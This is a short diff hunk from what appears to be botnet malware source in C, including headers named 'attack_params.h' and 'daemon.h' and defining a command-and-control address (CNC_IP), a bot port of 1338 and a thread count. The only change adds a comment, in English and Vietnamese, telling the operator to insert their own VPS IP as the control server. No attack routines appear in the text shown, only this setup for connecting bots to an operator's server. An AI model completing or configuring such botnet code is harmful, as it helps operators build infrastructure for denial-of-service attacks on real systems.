@@ -18,7 +18,7 @@
 #include "attack_params.h"
 #include "daemon.h"
 
-#define CNC_IP "0.0.0.0"
+#define CNC_IP "0.0.0.0" // YOUR VPS IP HERE/IP VPS GẮN Ở ĐÂY
 #define BOT_PORT 1338
 #define MAX_THREADS 1
 
